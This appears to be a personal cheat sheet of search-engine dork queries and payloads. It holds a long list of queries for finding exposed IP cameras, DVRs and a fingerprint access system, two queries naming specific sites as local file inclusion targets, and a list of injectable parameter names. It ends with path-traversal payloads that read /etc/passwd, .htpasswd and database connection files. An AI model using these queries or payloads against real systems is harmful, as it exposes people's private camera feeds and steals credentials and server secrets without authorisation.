# camera

inurl:"view/index.shtml"
inurl:"MultiCameraFrame?Mode=Motion"
VB Viewer inurl:/viewer/live/ja/live.html
intitle:"IP CAMERA Viewer" intext:"setting | Client setting"
intitle:"Device(" AND intext:"Network Camera" AND "language:" AND "Password"
intitle:"webcam 7" inurl:'/gallery.html'
intitle:"Yawcam" inurl:8081
inurl:control/camerainfo
intitle:"webcamXP 5" -download
inurl:"/view/view.shtml?id="
inurl:/view/viewer_index.shtml
intext:"powered by webcamXP 5"
intitle:webcam 7 inurl:8080 -intext:8080
intitle:"Live View / - AXIS" | inurl:view/view.shtml OR inurl:view/indexFrame.shtml | intitle:"MJPG Live Demo" | "intext:Select preset position"
allintitle: Axis 2.10 OR 2.12 OR 2.30 OR 2.31 OR 2.32 OR 2.33 OR 2.34 OR 2.40 OR 2.42 OR 2.43 "Network Camera "
allintitle:Edr1680 remote viewer
allintitle: EverFocus | EDSR | EDSR400 Applet
allintitle: EDR1600 login | Welcome
intitle:"BlueNet Video Viewer"
intitle:"SNC-RZ30" -demo
inurl:cgi-bin/guestimage.html
(intitle:(EyeSpyFX|OptiCamFX) "go to camera")|(inurl:servlet/DetectBrowser)
intitle:"Veo Observer XT" -inurl:shtml|pl|php|htm|asp|aspx|pdf|cfm -intext:observer
intitle:"iGuard Fingerprint Security System"
(intitle:MOBOTIX intitle:PDAS) | (intitle:MOBOTIX intitle:Seiten) | (inurl:/pda/index.html +camera)
intitle:"Edr1680 remote viewer"
intitle:"NetCam Live Image" -.edu -.gov -johnny.ihackstuff.com
intitle:"INTELLINET" intitle:"IP Camera Homepage"
intitle:"WEBDVR" -inurl:product -inurl:demo
intitle:"Middle frame of Videoconference Management System" ext:htm
tilt intitle:"Live View / - AXIS" | inurl:view/view.shtml
intitle:"AXIS 240 Camera Server" intext:"server push" -help
intitle:"--- VIDEO WEB SERVER ---" intext:"Video Web Server" "Any time & Any where" username password
intitle:HomeSeer.Web.Control | Home.Status.Events.Log
inurl:camctrl.cgi
intitle:"supervisioncam protocol"
intitle:"active webcam page"

# local file inclusion

site:researchforaction.org and "download"
inurl:"index.php?page="  lars-seeberg

# LFE

?cat=
?dir=
?action=
?date=
?detail=
?file=
?download=
?path=
?folder=
?prefix=
?include=
?page=
?locate=
?doc=
?site=
?view=
?content=
?document=
?layout=

https://example.com/?helpfile=login.txt
?file=???.//???.//etc/passwd
?file=..///////..////..//////etc/passwd
?file=..///////..////..//////etc/passwd
https://example.com/?helpfile=../secret/.htpasswd
https://example.com/?download=../include/connection.php

